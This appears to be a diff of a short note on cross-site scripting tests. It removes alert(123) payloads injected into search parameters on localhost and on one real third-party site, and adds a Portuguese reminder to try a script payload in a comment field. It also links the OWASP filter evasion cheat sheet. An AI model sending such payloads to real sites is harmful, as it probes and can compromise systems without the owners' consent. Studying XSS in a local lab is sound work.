@@ -1,8 +1,3 @@
-http://localhost:5000/?search=<script>alert(123)</script>
-http://localhost:5000/?search=<svg onload=alert(123)>
-http://localhost:5000/?search=<input onfocus=alert(123) autofocus>
-
-https://vidademotorista.com.br/?s=teste
-https://vidademotorista.com.br/?s=<svg onload=alert(123)>
+comentar '<script>alert(123)</script>'
 
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
